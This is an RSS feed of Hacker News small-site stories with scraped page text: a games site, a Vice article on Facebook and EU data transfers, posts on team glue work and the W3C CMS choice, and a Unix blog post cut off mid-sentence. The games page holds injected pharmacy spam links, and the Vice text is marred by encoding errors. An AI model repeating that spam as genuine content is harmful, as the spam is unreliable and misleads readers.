<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 27 Sep 2020 16:25:39 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 27 Sep 2020 16:25:39 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[MindSports]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24597388">thread link</a>) | @T-A
<br/>
September 26, 2020 | https://www.mindsports.nl/index.php | <a href="https://web.archive.org/web/*/https://www.mindsports.nl/index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						

						<div itemscope="" itemtype="https://schema.org/Blog">
<div>
			<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Welcome to MindSports		</h2>








<p><span color="#aa0000" size="+1"><b>Mindsports is as of now java-free!</b></span></p><p>

<b>Acknowledgement</b></p><ul type="square">
                  <span color="#FF0000"> 
                  <li><span color="#333333">We humbly acknowledge that old games 
                    are always better because inventing games is one of two human 
                    activities <i>excluded from progress</i>. The other one is the brain 
                    activity of people who subscribe to that point of view.</span>
                  </li>
                  <li><span color="#333333">You can play here for free. <a href="https://www.mindsports.nl/index.php/arena/"><span color="#773333"><b>The Arena</b></span></a> is dedicated to high strategy only, and features a rating system.<br>
Collateral damage can be found in <a href="https://www.mindsports.nl/index.php/the-pit/"><span color="#773333"><b>The Pit</b></span></a>.</span></li>
                  <li><span color="#333333">We're more committed to strategy games than to tactical ones. 
                    Here's the difference:<br>
                    Strategy games have strategies varied enough to allow different 
                    styles of play, tactics varied enough to induce their own 
                    terminology, and a structure that allows advantageous sub-goals 
                    to be achieved as <em>calculable</em> signposts along the 
                    way.<br>
                    Tactical games have strategies that are either fairly obvious (however deep), 
                    like Pente, or fairly opaque, like Othello.
                    </span></li>
</span></ul> 



		</div>
			</div>
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Spirit		</h2>








<ul type="square">
<span color="#FF0000">
                  <li><span color="#333333">Games have a spirit - the ones of Chess and Draughts have been implemented in one form  or another by almost every culture in the world.</span></li>
                  <li><span color="#333333">We're not entirely serious all the time, yet we may bring up that:<ul type="square"><span color="#000088"> 
   <li><span color="#333333">Having thoughts is not the same as thinking.</span></li>
   <li><span color="#333333">Opinions are difficult because they're too damn easy.</span></li>
   <li><span color="#333333">It's hard to recognise tunnel vision if you're inside one.</span></li>
   <li><span color="#333333">Jos√© Ra√∫l Capablanca and Bobby Fischer were great players, <a href="https://www.mindsports.nl/index.php/arena/chess/423-why-do-great-players-make-poor-inventors">not great inventors</a>.</span></li>
   <li><span color="#333333">Forcing an idea to work will not earn you the gratitude of the result.</span></li>
   <li><span color="#333333">Draughts players are hooked on opposition - they'll oppose anything.</span></li>
   <li><span color="#333333">It's easy to make a small fortune with abstract games, just start with a big one.</span></li>
   <li><span color="#333333">Inventors of abstract games are all the same, but some more so than others.</span></li>
   <li><span color="#333333">Life is fundamentally futile and great games are a tribute to precisely that.</span></li>
</span></ul><br>
</span></li>
</span></ul> 



			</div>
			
			
		</div>
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			On programmability		</h2>








<ul type="square"><span color="#FF0000">
                    <li><span color="#333333"><a href="https://deepmind.com/blog/alphago-zero-learning-scratch/" target="_blank">AlphaGo Zero: Learning from scratch</a></span><p><i><span color="#333333">This is about Go, but AI has taken over all major games now and will be stronger than humans right from the start in any new game in the future. So humans will have superhuman tutors.</span></i></p></li>
                    <li><span color="#333333"><a href="https://arxiv.org/pdf/1712.01815.pdf" target="_blank">AlphaZero: Mastering Chess and Shogi by Self-Play</a></span><p><i><span color="#333333">Starting from random play, and given no domain knowledge except the game rules, AlphaZero achieved within 24 hours a superhuman level of play in the games of chess and shogi (Japanese chess) as well as Go, and convincingly defeated a world-champion program in each case.</span></i></p></li>
</span></ul> 



			</div>
			
			
		</div>
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Apps		</h2>








<ul type="square">
                  <span color="#FF0000">
<li><span color="#333333">These mindsports games have been app'd in <a href="http://www.msoworld.com/" target="_blank">Windows 8</a> by <a href="http://www.sylien.com/" target="_blank">Sylien Games</a>:</span></li>
</span></ul><p id="jkl659">Well already everyone have that <a href="http://cialiscom.biz/cialis-for-sale.html">cialis for sale cheap</a> can be found with ease in the Internet. In special on our website it is full of it. But you forget and constantly you ask. </p>

 



			</div>
			
			
		</div>
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Upcoming / running events		</h2>








<ul type="square">
                  <span color="#FF0000"> 
                   <li><span color="#333333"><a href="https://www.uschesschamps.com/2020-champions-showdown-chess-9lx/overview" target="_blank">2020 Champions Showdown: Chess 9LX</a></span></li><p><span color="#333333"><i>The top international chess superstars are set to battle online from September 11-13 in Championships Showdown: Chess 9LX hosted by the Saint Louis Chess Club.  Champions Showdown: Chess 9LX will feature the world‚Äôs top grandmasters including legendary World Champion Garry Kasparov, the reigning World Champion Magnus Carlsen, and World Number 2 Fabiano Caruana. The matches will be played in Chess 960 style, also known as Fischer Random, with a $150,000 prize fund.</i></span></p> 
</span></ul> 



			</div>
			
			
		</div>
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Puzzles		</h2>








<ul type="square">
                  <span color="#FF0000"> 
                   <li><span color="#333333">In this section you will find a number of combinatorial puzzles in two classes, <a href="https://www.mindsports.nl/index.php/puzzles/tilings"><b>tilings</b></a> and <a href="https://www.mindsports.nl/index.php/puzzles/3d"><b>3D</b></a>.<br>All puzzles ¬© MindSports.</span></li>
</span></ul> 



			</div>
			
			
		</div>
		
	
		
		
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Side dishes		</h2>








<ul type="square">
                  <span color="#FF0000"> 
                   <li><span color="#333333"><a href="https://www.mindsports.nl/index.php/side-dishes/math/">Math</a>: We've discovered a <a href="https://www.mindsports.nl/index.php/side-dishes/math/on-root-approach">structure</a> of the series of successively better approximations of the roots of natural numbers, and the inherent division of non-squares in two distinct classes: carr√©phylic and carr√©phobic numbers.</span></li>
</span></ul> 



			</div>
			
			
		</div>
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			I Ching Connexion		</h2>








<ul type="square">
                  <span color="#FF0000"> 
                  <li><span color="#333333">The <a href="https://www.mindsports.nl/index.php/i-ching-connexion/">I Ching Connexion</a>, a divination program based on the one-to-one correlation between the 64 hexagons of the <a href="https://www.mindsports.nl/index.php/puzzles/tilings/china-labyrinth/">China Labyrinth</a> and the 64 hexagrams of the I Ching, is now available <a href="https://www.mindsports.nl/index.php/i-ching-connexion/i-ching-divination"><b>online</b></a>.</span></li>
</span></ul> 



			</div>
			
			
		</div>
		
	
		
		<div>
					<div itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
			

	<h2 itemprop="headline">
			Finally		</h2>








<ul type="square"><span color="#ff0000">
                  <li><span color="#333333">We're not democratic, but we welcome suggestions 
                   and we do actually answer questions (sometimes).</span></li>
                  <li><span color="#333333">A note on gender: we use pronouns like 'he' or 'him' 
                   to exclude awkward constructions rather than women.</span></li>
</span></ul><p id="jkl47">Well already everyone be aware of that <a href="http://cialiscom.biz/cialis-for-sale.html">cialis for sale cheap</a> can be found with ease in the Internet. In particular on our website it is full of it. But you forget and constantly you ask. </p>

 



			</div>
			
			
		</div>
		
	


</div>
			</div></div>]]>
            </description>
            <link>https://www.mindsports.nl/index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24597388</guid>
            <pubDate>Sat, 26 Sep 2020 08:58:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook Says It Will Stop Operating in Europe If Regulators Don‚Äôt Back Down]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24597347">thread link</a>) | @notRobot
<br/>
September 26, 2020 | https://www.vice.com./en_us/article/889pk3/facebook-threatens-to-pull-out-of-europe-if-it-doesnt-get-its-way | <a href="https://web.archive.org/web/*/https://www.vice.com./en_us/article/889pk3/facebook-threatens-to-pull-out-of-europe-if-it-doesnt-get-its-way">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Soumyabrata Roy/NurPhoto via AP</p></div><div data-component="BodyComponentRenderer"><p><span data-component="TextBlock"></span><span data-component="TextBlock"><p>CORK, Ireland √¢‚Ç¨‚Äù Facebook has threatened to pack up its toys and go home if European regulators don√¢‚Ç¨‚Ñ¢t back down and let the social network get its own way.</p>
</span><span data-component="TextBlock"><p>In a court filing in Dublin, Facebook said that a decision by Ireland√¢‚Ç¨‚Ñ¢s Data Protection Commission (DPC) would force the company to pull up stakes and leave the 410 million people who use Facebook and photo-sharing service Instagram in the lurch.</p>
</span></p><p><span data-component="TextBlock"><p>If the decision is upheld, √¢‚Ç¨≈ìit is not clear to [Facebook] how, in those circumstances, it could continue to provide the Facebook and Instagram services in the EU,√¢‚Ç¨ÔøΩ Yvonne Cunnane, who is Facebook Ireland√¢‚Ç¨‚Ñ¢s head of data protection and associate general counsel, <a href="https://www.dropbox.com/s/yngcdv99irbm5sr/Facebook%20DPC%20filing%20Sept%202020-rotated.pdf?dl=0">wrote in a sworn affidavit</a>.</p>
</span><span data-component="TextBlock"><p>The decision Facebook√¢‚Ç¨‚Ñ¢s referring to is <a href="https://www.vice.com/en_ca/article/v7gkgy/europe-ordered-facebook-to-stop-sending-user-data-to-the-united-states">a preliminary order handed down last month</a> to stop the transfer of data about European customers to servers in the U.S., over concerns about U.S. government surveillance of the data.</p>
</span><span data-component="TextBlock"><p>Facebook hit back by filing a lawsuit challenging the Irish DPC√¢‚Ç¨‚Ñ¢s ban, and in a sworn affidavit filed this week, the company leveled some very serious accusations about the Irish data-protection commissioner, including a lack of fairness and apparent bias in singling out Facebook.</p>
</span><span data-component="TextBlock"><p>Cunnane points out that Facebook was given only three weeks to respond to the decision, a period that is √¢‚Ç¨≈ìmanifestly inadequate,√¢‚Ç¨ÔøΩ adding that Facebook wasn√¢‚Ç¨‚Ñ¢t contacted about the inquiry prior to judgment being handed down.</p>
</span><span data-component="TextBlock"><p>She also raises concerns about the decision being made √¢‚Ç¨≈ìsolely√¢‚Ç¨ÔøΩ by Helen Dixon, Ireland√¢‚Ç¨‚Ñ¢s data protection commissioner.</p>
</span><span data-component="TextBlock"><p>√¢‚Ç¨≈ìThe fact one person is responsible for the entire process is relevant to [Facebook√¢‚Ç¨‚Ñ¢s] concerns, in respect of the inadequacy of the investigative process engaged in and independence of the ultimate decision-making process,√¢‚Ç¨ÔøΩ Cunnane wrote.</p>
</span><span data-component="TextBlock"><p>Cunnane also complains that Facebook is being singled out, noting no other big tech company using similar methods to transfer data to the U.S. from the EU is under the same scrutiny.</p>
</span></p><p><span data-component="TextBlock"><p>√¢‚Ç¨≈ìThis gives rise to an apprehension that [Facebook] is not being treated equally,√¢‚Ç¨ÔøΩ Cullinane wrote. √¢‚Ç¨≈ìIf [Facebook] alone is being investigated and subject to a suspension of data transfers to the U.S., this would be liable to create a serious distortion of competition.√¢‚Ç¨ÔøΩ</p>
</span><span data-component="TextBlock"><p>The Irish DPC declined to comment to VICE News. Facebook denies that it is trying to force the regulator to change its decision with a threat with withdraw its services.</p>
</span><span data-component="TextBlock"><p>√¢‚Ç¨≈ìFacebook is not threatening to withdraw from Europe,√¢‚Ç¨ÔøΩ a Facebook spokesperson said, adding that the court filing simply lays out how √¢‚Ç¨≈ìFacebook, and many other businesses, organisations and services, rely on data transfers between the EU and the US in order to operate their services.√¢‚Ç¨ÔøΩ</p>
</span><span data-component="TextBlock"><p>A judge last week allowed Facebook√¢‚Ç¨‚Ñ¢s challenge to go ahead and put a stay on the DPC√¢‚Ç¨‚Ñ¢s ban on data transfers √¢‚Ç¨‚Äù though the DPC can challenge that decision.</p>
</span><span data-component="TextBlock"><p>Besides threatening to close down Facebook and Instagram completely, Cunnane also points out that Facebook is an important tool for the freedom of expression of its 410 million EU users √¢‚Ç¨‚Äù it also reportedly generated √¢‚Äö¬¨208 billion in sales for companies who use the platforms.</p>
</span><span data-component="TextBlock"><p>What she failed to mention, though, is that the service has also been weaponized to sow disinformation and conspiracy theories, as well as being used to influence the results of votes across the region, <a href="https://www.politico.eu/article/cambridge-analytica-leave-eu-ukip-brexit-facebook/">including the U.K.√¢‚Ç¨‚Ñ¢s decision to leave the EU</a>.</p>
</span><span data-component="TextBlock"><p>Facebook√¢‚Ç¨‚Ñ¢s entire business model relies on being able to easily and quickly transfer data across the globe so that it can better target users with ads. By disrupting that flow of data, the EU is threatening Facebook√¢‚Ç¨‚Ñ¢s revenue potential, and as this lawsuit shows, that is something the company takes very seriously indeed.</p>
</span><span data-component="TextBlock"><p>But Facebook√¢‚Ç¨‚Ñ¢s ultimatum is little more than an empty threat, according to privacy experts.</p>
</span><span data-component="TextBlock"><p>√¢‚Ç¨≈ìThe idea that Facebook would withdraw from the European market is absurd brinksmanship that I don√¢‚Ç¨‚Ñ¢t think anyone truly believes,√¢‚Ç¨ÔøΩ Michael Veale, a technology policy researcher at University College London, told VICE News.</p>
</span><span data-component="TextBlock"><p><em>Cover: In this illustration photo, the logo of Facebook is displayed on a smartphone in Tehatta, Nadia, West Bengal; India on June 4, 2020. (Photo Illustrattion by Soumyabrata Roy/NurPhoto via AP)</em></p>
</span></p></div><div><div><div><p><h3>Get a personalized roundup of VICE's best stories in your inbox.</h3></p><p>By signing up to the VICE newsletter you agree to receive electronic communications from VICE that may sometimes include advertisements or sponsored content.</p></div></div></div></div>]]>
            </description>
            <link>https://www.vice.com./en_us/article/889pk3/facebook-threatens-to-pull-out-of-europe-if-it-doesnt-get-its-way</link>
            <guid isPermaLink="false">hacker-news-small-sites-24597347</guid>
            <pubDate>Sat, 26 Sep 2020 08:47:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On doing glue work in a team]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24597091">thread link</a>) | @A_No_Name_Mouse
<br/>
September 26, 2020 | https://noidea.dog/glue | <a href="https://web.archive.org/web/*/https://noidea.dog/glue">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="canvas">

      
  
  



    

    

    

    <section id="page" role="main" data-content-field="main-content">
      <!-- CATEGORY NAV -->
      
      <div data-type="page" data-updated-on="1592981380911" id="page-5cc7644e852586000128e46b"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1556734196837_9137"><div><p>Your job title says "software engineer", but you seem to spend most of your time in meetings. You'd like to have time to code, but nobody else is onboarding the junior engineers, updating the roadmap, talking to the users, noticing the things that got dropped, asking questions on design documents, and making sure that everyone's going roughly in the same direction. If you stop doing those things, the team won't be as successful. But now someone's suggesting that you might be happier in a less technical role. If this describes you, congratulations: you're the glue. If it's not, have you thought about who is filling this role on your team?</p><p>Every senior person in an organisation should be aware of the less glamorous - and often less-promotable - work that needs to happen to make a team successful. Managed deliberately, glue work demonstrates and builds strong technical leadership skills. Left unconscious, it can be career limiting. It can push people into less technical roles and even out of the industry.</p><p>Let's talk about how to allocate glue work deliberately, frame it usefully and make sure that everyone is choosing a career path they actually want to be on.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1556739775888_8389"><p>(üíñüíñüíñThank so much to the organisers of the amazing <a href="https://theleaddeveloper.com/" target="_blank">Lead Developer conference</a> where I presented this version of these slides. Thank you also to the organizers of the equally amazing<a href="https://www.writespeakcode.com/" target="_blank"> Write/Speak/Code conference </a>who accepted the first iteration of this talk. You are wonderful folks and I so appreciate the work you do. üíñüíñüíñ)</p></div></div><div><div data-block-type="51" id="block-yui_3_17_2_1_1592980352948_19617"><div>


<div>
  <form data-form-id="5ef2f43280c2046beb659fc7" autocomplete="on" method="POST" onsubmit="return (function (form) {
    Y.use('squarespace-form-submit', 'node', function usingFormSubmit(Y) {
      (new Y.Squarespace.FormSubmit(form)).submit({
        formId: '5ef2f43280c2046beb659fc7',
        collectionId: '5cc7644e852586000128e46b',
        objectName: 'page-5cc7644e852586000128e46b'
      });
    });
    return false;
  })(this);">
    
    
    <p>No spam, I promise.</p>
    <p>Thank you!</p>
    
  </form>
</div>
</div></div><div data-aspect-ratio="90.83333333333333" data-block-type="5" id="block-yui_3_17_2_1_1556734196837_13841"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <a href="https://twitter.com/deniseyu21/status/1123313394113753088" data-animation-role="image" data-description="">
            
            <img data-src="https://images.squarespace-cdn.com/content/v1/5a05ececd55b4165f250f032/1556734772289-TZ8L8K9LCIPEQGXSM8LO/ke17ZwdGBToddI8pDm48kKwP5wc_189XiWLTNbaYn7EUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8GRo6ASst2s6pLvNAu_PZdJQr8gHdfuVEBZ6fGgEWibFK9OSZJCsAjo5_hH76asz9_aMLW6xIlFKyCazI6z63-Q/image-asset.jpeg" data-image="https://images.squarespace-cdn.com/content/v1/5a05ececd55b4165f250f032/1556734772289-TZ8L8K9LCIPEQGXSM8LO/ke17ZwdGBToddI8pDm48kKwP5wc_189XiWLTNbaYn7EUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8GRo6ASst2s6pLvNAu_PZdJQr8gHdfuVEBZ6fGgEWibFK9OSZJCsAjo5_hH76asz9_aMLW6xIlFKyCazI6z63-Q/image-asset.jpeg" data-image-dimensions="601x1024" data-image-focal-point="0.5,0.5" alt="" src="https://images.squarespace-cdn.com/content/v1/5a05ececd55b4165f250f032/1556734772289-TZ8L8K9LCIPEQGXSM8LO/ke17ZwdGBToddI8pDm48kKwP5wc_189XiWLTNbaYn7EUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8GRo6ASst2s6pLvNAu_PZdJQr8gHdfuVEBZ6fGgEWibFK9OSZJCsAjo5_hH76asz9_aMLW6xIlFKyCazI6z63-Q/image-asset.jpeg">
            
          
            </a>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div><p>https://twitter.com/deniseyu21/status/1123313394113753088</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div></div></div></div>
    </section>

    

    

    

  </div></div>]]>
            </description>
            <link>https://noidea.dog/glue</link>
            <guid isPermaLink="false">hacker-news-small-sites-24597091</guid>
            <pubDate>Sat, 26 Sep 2020 07:40:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On not choosing WordPress for the W3C redesign project]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 79 (<a href="https://news.ycombinator.com/item?id=24596769">thread link</a>) | @ziodave
<br/>
September 25, 2020 | https://w3c.studio24.net/updates/on-not-choosing-wordpress/ | <a href="https://web.archive.org/web/*/https://w3c.studio24.net/updates/on-not-choosing-wordpress/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div tabindex="0"> <div>  <div class="page"> <div id="main-content" role="main">  <p> <span>Updates</span> <span>CMS</span> </p>  <hr> <p>The W3C redesign project is an incredibly exciting one for us at Studio 24, it‚Äôs an honour to be working with an organisation we have looked up to for our whole career. But it‚Äôs also challenging, with many aspects coming under more scrutiny than we‚Äôre normally used to. It‚Äôs also made harder in this time of pandemic, with increased anxiety and challenges working effectively during this ‚Äúnew normal‚Äù we‚Äôre all living in.</p> <p>We‚Äôre happy to rise to this challenge. Yesterday a well written article was published by WordPress Tavern on <a href="https://wptavern.com/w3c-drops-wordpress-from-consideration-for-redesign-narrows-cms-shortlist-to-statamic-and-craft">W3C dropping WordPress from consideration</a> which I‚Äôd like to respond to.</p> <h2 id="in-context-of-the-project"> <a href="#in-context-of-the-project"></a> In context of the project </h2> <p>We‚Äôve tackled a huge variety of work so far from initial Discovery, User Research, Information Architecture, Content Design and UX Design that has helped move the project forward.</p> <p>The CMS platform decision is just part of this and for the end website is one of the less visible aspects. As you can read from <a href="https://w3c.studio24.net/docs/cms-selection-report/">Marie‚Äôs report on the work we did to choose Craft CMS</a> you can see the steps we went through to help shortlist and choose a CMS.</p> <p>For us, and the requirements from W3C, the delivery of accessible HTML/CSS pages that meet user needs is the most important part of this project - and where we are focussing our time. All in, we spent around 15 days on the CMS platform choice. Enough to help evaluate a limited number of options, but not enough to do a thorough review of the state of accessibility in a wide range of CMSs.</p> <p>We were surprised by the accessibility issues that cropped up in CMS platforms after our <a href="https://w3c.studio24.net/docs/w3c-cms-selection-process-update/">initial CMS review</a>. This prompted us to prioritise accessibility above other requirements due to the <a href="https://www.w3.org/Consortium/mission#principles">principles and values of W3C</a>.</p> <h2 id="challenges-of-gutenberg-for-now"> <a href="#challenges-of-gutenberg-for-now"></a> Challenges of Gutenberg (for now) </h2> <p><a href="https://www.studio24.net/">Studio 24</a> is a firm supporter of open source software and we use <a href="https://www.wordpress.org/">WordPress</a> extensively for our client work. For this project we had committed to not selecting a CMS until we‚Äôd had the chance to better understand client requirements.</p> <p>An important consideration for WordPress was accessibility concerns with the new Gutenberg editor. Many have written about the <a href="https://www.marcozehe.de/my-thoughts-on-gutenberg-accessibility/">accessibility issues</a> the project has had as well as the positive <a href="https://www.marcozehe.de/whats-new-for-accessibility-in-gutenberg-7-2/">steps to improve accessibility in Gutenberg</a>.</p> <p>Gutenberg is an exciting and really interesting development. Many CMS vendors are looking at ways to allow editors to create more flexible content from compontents or blocks. However, this comes with huge challenges on how to make innovative user interfaces accessible. WordPress decided to use the JavaScript framework <a href="https://reactjs.org/">React</a> to meet these needs.</p> <p>We <a href="https://medium.com/studio24/we-tried-converting-a-bespoke-website-design-in-wordpress-with-gutenberg-42e11986b05a">tested Gutenberg</a> six months before it was released in WordPress 5. Recently we worked on a project for the University of Cambridge creating a site for their <a href="https://magazine.alumni.cam.ac.uk/">Alumni magazine</a>. This launched in April 2020 and uses Gutenberg to manage content. This gave us a good idea of how Gutenberg works. In June, we reviewed the current accessibility issue backlog (<a href="https://github.com/WordPress/gutenberg/labels/Accessibility%20%28a11y%29">issues</a>, <a href="https://github.com/WordPress/gutenberg/projects/25">a11y project</a>) and had some feedback from users with accessibility needs who had difficulties using the current user interface. This was a contributing factor in our decision that WordPress was not a good fit for this project.</p> <p>Given the importance the WordPress project has put on Gutenberg as the future of WordPress we did not feel it was reasonable to recommend using the Classic Editor if there is a good chance this will not be supported in the future. At present <a href="https://make.wordpress.org/core/2018/11/07/classic-editor-plugin-support-window/">Classic Editor is slated for end of life in Dec 2021</a>.</p> <p>We look forward to the continued development of Gutenberg and applaud efforts to make it more accessible. We appreciate improvements have been made since our review and we‚Äôre very glad to see the <a href="https://wpaccessibilityday.org/">WordPress Accessibility Day</a> on 2nd October.</p> <h2 id="front-end-complexity"> <a href="#front-end-complexity"></a> Front-end complexity </h2> <p>From a business perspective I also believe Gutenberg creates a complexity issue that makes it challenging for use by many agencies who create custom websites for clients; where we have a need to create lots of bespoke blocks and page elements for individual client projects.</p> <p>The use of React complicates front-end build. We have very talented front-end developers, however, they are not React experts - nor should they need to be. I believe front-end should be built as standards-compliant HTML/CSS with JavaScript used to enrich functionality where necessary and appropriate.</p> <p>As of yet, we have not found a satisfactory (and profitable) way to build custom Gutenberg blocks for commercial projects. We won‚Äôt stop trying though and plan to do more R&amp;D with Gutenberg in the future. The W3C project, however, did not feel like the right place to do this. On a project as wide-ranging as this one, development time does become a factor.</p> <p>Drupal also has this complexity issue which makes developing sites harder than it needs to be, and is why we didn‚Äôt consider that platform either. I‚Äôve talked to <a href="https://torchbox.com/blog/torchbox-has-dropped-drupal/">other agencies who have decided to drop Drupal</a> due to its complexity.</p> <h2 id="the-question-of-open-source"> <a href="#the-question-of-open-source"></a> The question of open source </h2> <p>The W3C embraces and supports the open web. However, as an agency we also have to be practical when it comes to the tools we use to build sites. From our review, which was focussed on PHP-based CMSs, Craft and Statamic came out as meeting all the key requirements and are both very developer-friendly platforms. An important consideration for a tool that we need to hand over to W3C to maintain in the future.</p> <p>While their <a href="https://github.com/craftcms/cms">source code</a> is open, they do have commercial licenses and cost money (though a modest sum). Charging money enables small teams to develop good software, so we‚Äôre not ideologically against this business model. Both platforms are well respected in the community and well-used by professionals, running sites such as <a href="https://media.netflix.com/en/">Netflix</a> and <a href="https://www.bigcommerce.com/">Big Commerce</a> in Craft, <a href="https://www.spiegel.de/plus/">Spiegel Plus</a> and <a href="https://www.freshbooks.com/">FreshBooks</a> in Statamic.</p> <p>We are using open source technology in the majority of this project (HTML/CSS, JavaScript, PHP, Symfony). While Craft is a proprietary CMS, this has given us the advantage of direct access to the team developing the CMS which has helped improve accessibility in these CMSs. We hope this helps move accessibility forward in the CMS industry.</p> <p>Open tools will continue to be used to publish the standards of the web. The <a href="https://www.w3.org/TR/">Technical Reports</a> page is powered by <a href="https://symfony.com/">Symfony</a> and specifications will continue to be published to <a href="https://github.com/w3c">GitHub</a> to facilitate open discussion. Nothing‚Äôs changing with how the W3C work in the open.</p> <h2 id="a-note-on-front-end-delivery"> <a href="#a-note-on-front-end-delivery"></a> A note on front-end delivery </h2> <p>One final note. We are currently considering a <a href="https://www.studio24.net/blog/what-is-a-headless-cms/">Headless CMS</a> option for front-end page delivery. This means using the CMS in a decoupled way to manage content but use a separate system to deliver front-end pages. Please note this solution would not be reliant on JavaScript (e.g. a single page app which is common with headless). Under this option we‚Äôd use Symfony to deliver front-end pages which is an established technology W3C already use across a lot of the site.</p> <p>This may give W3C better flexibility for the future, though comes at a cost of added complexity. The W3C site is already made up of a lot of different systems, the CMS is just one part of the what makes up the varied content on <a href="https://www.w3.org/">w3.org</a>.</p> <p>I hope this helps explain the thought process behind our decision a little more and addresses some of the valid concerns highlighted in the WordPress Tavern post.</p> <hr>  </div> </div> </div> </div></div>]]>
            </description>
            <link>https://w3c.studio24.net/updates/on-not-choosing-wordpress/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596769</guid>
            <pubDate>Sat, 26 Sep 2020 06:05:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is the C runtime and library a legitimate part of the Unix API?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24596680">thread link</a>) | @ingve
<br/>
September 25, 2020 | https://utcc.utoronto.ca/~cks/space/blog/unix/UnixAPIAndCRuntime | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/unix/UnixAPIAndCRuntime">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Is the C runtime and library a legitimate part of the Unix API?</h2>

	<p><small>December 31, 2017</small></p>
</div><div><p>One of the knocks against Go is, to quote from <a href="https://marcan.st/2017/12/debugging-an-evil-go-runtime-bug/">Debugging an evil
Go runtime bug</a> (partly
<a href="https://zaitcev.livejournal.com/240821.html">via</a>):</p>

<blockquote><p>Go also happens to have a (rather insane, in my opinion) policy of
reinventing its own standard library, so it does not use any of the
standard Linux glibc code to call vDSO, but rather rolls its own calls
(and syscalls too).</p>
</blockquote>

<p>Ordinary non-C languages on Unixes generally implement a great many
low level operations by calling into the standard C library. This
starts with things like making system calls, but also includes
operations such as <code>getaddrinfo(3)</code>. Go doesn't do this; it implements
as much as possible itself, going straight down to direct system
calls in assembly language. Occasionally there are problems that
ensue.</p>

<p>A few Unixes explicitly say that the standard C library is the
stable API and point of interface with the system; one example is
Solaris (and now Illumos). Although they don't casually change the
low level system call implementation, as far as I know Illumos
officially reserves the right to change all of their actual system
calls around, breaking any user space code that isn't dynamically
linked to <code>libc</code>. If your code breaks, it's your fault; Illumos
told you that dynamic linking to <code>libc</code> is the official API.</p>

<p>Other Unixes simply do this tacitly and by accretion. For example,
on any Unix using <code>nsswitch.conf</code>, it's very difficult to always
get the same results for operations like <code>getaddrinfo()</code> without
going through the standard C library, because these may use arbitrary
and <a href="https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdResolvedNotes">strange</a> dynamically loaded
modules that are accessed through <code>libc</code> and require various random
<code>libc</code> APIs to work. This points out one of the problems here; once
you start (indirectly) calling random bits of the <code>libc</code> API, they
may quite reasonably make assumptions about the runtime environment
that they're operating in. How to set up a limited standard C library
runtime environment is generally not documented; instead the official
view is generally 'let the standard C library runtime code start
your <code>main()</code> function'.</p>

<p>I'm not at all sure that all of this requirement and entanglement
with the standard C library and its implicit runtime environment
is a good thing. The standard C library's runtime environment is
designed for C, and it generally contains a tangled skein of
